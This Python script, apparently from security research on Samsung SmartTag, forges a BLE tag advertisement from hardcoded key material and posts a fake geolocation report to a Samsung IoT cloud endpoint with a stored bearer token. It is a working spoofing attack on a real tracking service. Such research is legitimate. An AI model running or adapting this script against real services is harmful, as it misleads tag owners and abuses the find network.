# -----------------------------------------------------------
# This script creates fake location reports for a lost tag
# (c) 2022 Tingfeng Yu
# -----------------------------------------------------------

import argparse
import base64
import datetime
import time

import requests
from script5_get_tokens import *
from smarttag_crypto import EncryptionPIDManager, TagState
from utils import log

jwe_token = None


def report_fake_location(lat, lon, service_data):
    global jwe_token
    service_data = base64.urlsafe_b64encode(service_data).decode("utf-8")
    cur_time = int(time.time() * 1000)
    print("service data: ", service_data, " , current time: ", cur_time)
    req_headers = {
        "Authorization": "Bearer " + jwe_token,
        "Content-Type": "application/json; charset=utf-8",
    }
    req_body = {
        "items": [
            {
                "geolocation": {
                    "accuracy": "18.935",
                    "battery": "FULL",
                    "latitude": str(lat),
                    "longitude": str(lon),
                    "method": "wifi",
                    "rssi": "-43",
                    "speed": "0.0",
                    "timeStamp": cur_time,
                    "valid": True,
                },
                "tagAdvertisement": {"serviceData": service_data},
            }
        ],
        "findNode": {
            "configuration": {
                "allowManualGeolocation": False,
                "allowedNlpGap": 2000,
                "src": "chaser",
            },
            "host": "GALAXY_PHONE",
            "id": "1234aaf12de86d1dc716e244870657e794605871fb10bbb0a45a65571e7d5fd43490",
            "type": "MOVING",
            "version": "722500014",
        },
    }
    url = "https://chaser-ap03-apnortheast2.samsungiotcloud.com/geolocations"
    print("submitting report...")
    response = requests.post(url, headers=req_headers, json=req_body)
    print(response.json())


def get_test_ble_data():
    privacyIV = "ia/KBz/5TaqIspjbJTyufg=="
    privacyIdSeed = "AAAAAAApG1Y="
    mastersecret = "Dq4jyPPOWJII2fSqA5Ug32SvJVD5xgjmKrrokY_4N-0="
    myclass = EncryptionPIDManager(mastersecret, privacyIV, privacyIdSeed)
    data = myclass.generate_adv_data(TagState.OFFLINE)
    print("data ", data.hex())
    return data


def main():
    global jwe_token
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--user", dest="user_idx", type=int, default=0, help="--user 0 or 1"
    )
    args = parser.parse_args()
    user_idx = args.user_idx

    user = load_user_info(user_idx)
    jwe_token = user["jwe_token"]
    no_valid_jwe_token = False
    if no_valid_jwe_token:
        jwe_token = get_jwe_token()
        user["jwe_token"] = jwe_token
        save_user_info(user, user_idx)
    lat = -50
    lon = 150

    # service_data = bytes.fromhex("136d3901f434bbc40c45fcebc30000009e8bc69c")
    # service_data = bytes.fromhex("136d39019d43dde6711d19e1c3000000c7bade06") # dup tag

    service_data = get_test_ble_data()
    report_fake_location(lat, lon, service_data)


if __name__ == "__main__":
    main()
